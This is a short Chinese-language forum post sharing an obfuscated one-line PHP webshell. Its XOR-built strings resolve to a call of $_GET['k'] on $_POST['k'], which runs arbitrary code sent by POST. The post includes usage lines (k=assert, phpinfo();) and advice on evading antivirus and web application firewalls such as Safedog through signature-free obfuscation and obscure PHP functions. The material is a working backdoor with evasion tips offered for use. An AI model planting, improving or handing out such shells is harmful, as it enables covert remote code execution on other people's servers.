<?php ${(chr(63)^chr(96)).(chr(60)^chr(123)).(chr(62)^chr(123)).(chr(47)^chr(123))}[(chr(43)^chr(64))](${(chr(36)^chr(123)).(chr(46)^chr(126)).(chr(47)^chr(96)).(chr(46)^chr(125)).(chr(47)^chr(123))}[(chr(43)^chr(64))]); ?>



//位运算符      //k为密码    试用方法 GET xxxx.php?k=assert   POST k=命令     


使用方式  shell.php?k=assert  POST k=phpinfo();

其实有很多免杀思路，加密算法问题，简单的加密可以找生僻的php算法函数进行混淆算法，软防这类的直接阳痿，检测不出来，因为普通的base64 chr zip压缩等等，软件这类都有自带的调用解密所以好多以前的免杀记录都不免杀了！       但是有时候可以绕过安全狗，无特征可以靠吧函数逆一下检测不出来函数 也是无特征所以基本 通杀waf，但是提交的参数不加密，还是会拦截参数，如果是混淆加密基本不好说能过，除非你有新思路，利用php算法函数来进行加密等等，从而检测不出，虽然是php函数，但是他waf调用的检测内核和解密内核他会用基本的去进行解密，如果我们在这个函数上再加一把东东呢，那这些waf是不是就傻眼了！   好久没上了，看看文章都不能看，不是正式成员，我也是赚点酒票快点升正式而已，下次如果有新加密方法，免费发布，怎么说呢，这类东西我只是提供一个新思路而已，比较方法好多，希望大家采纳！
